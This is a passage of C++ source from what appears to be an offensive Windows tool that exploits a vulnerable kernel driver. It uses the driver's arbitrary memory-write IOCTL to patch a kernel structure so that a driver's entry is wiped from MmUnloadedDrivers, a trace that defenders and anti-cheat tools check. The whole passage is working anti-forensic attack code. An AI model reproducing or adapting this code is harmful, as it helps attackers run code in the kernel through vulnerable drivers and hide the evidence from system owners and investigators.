		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), cannot read the unloaded driver name\n", DriverName);
		return FALSE;
	}


	// MiRememberUnloadedDriver will check if the length > 0 to save the unloaded driver:
	DriverBaseDllName.Length = 0;
	if (!VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, general::ManipulateAddress(DriverSection, 0x58, TRUE), &DriverBaseDllName, sizeof(DriverBaseDllName))) {
		wprintf(L"[-] Cannot delete actual entry of driver %s in MmUnloadedDrivers(), failed to patch UNICODE_STRING of unloaded driver\n", DriverName);
		return FALSE;
	}

	wprintf(L"[+] Cleaned driver %s from MmUnloadedDrivers()\n", DriverName);
	return TRUE;
}